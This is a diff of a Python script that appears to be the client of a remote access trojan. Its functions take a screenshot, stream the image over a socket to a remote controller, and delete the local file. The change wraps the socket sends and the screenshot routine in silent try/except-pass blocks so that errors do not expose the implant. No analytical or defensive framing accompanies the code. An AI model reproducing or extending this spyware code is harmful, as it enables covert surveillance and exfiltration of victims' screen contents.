@@ -25,23 +25,29 @@ def decode_utf8(data):
 def receive_data(buffer):
     return s.recv(buffer)
 def send_data(data):
-    s.send(data)
+    try:
+        s.send(data)
+    except:
+        pass
 def take_screenshot():
     picture_name = "beautiful.png"
-    pyscreeze.screenshot(picture_name)
+    try:
+        pyscreeze.screenshot(picture_name)
 
-    file = open(picture_name, "rb")
-    
-    image_data = file.read(1024)
-
-    while image_data:
-        send_data(image_data)
+        file = open(picture_name, "rb")
+        
         image_data = file.read(1024)
 
-    time.sleep(1)
-    send_data('done'.encode())
-    file.close()
-    os.remove(picture_name)
+        while image_data:
+            send_data(image_data)
+            image_data = file.read(1024)
+
+        time.sleep(1)
+        send_data('done'.encode())
+        file.close()
+        os.remove(picture_name)
+    except:
+        pass
 
 def send_file(file_directory):
     try:
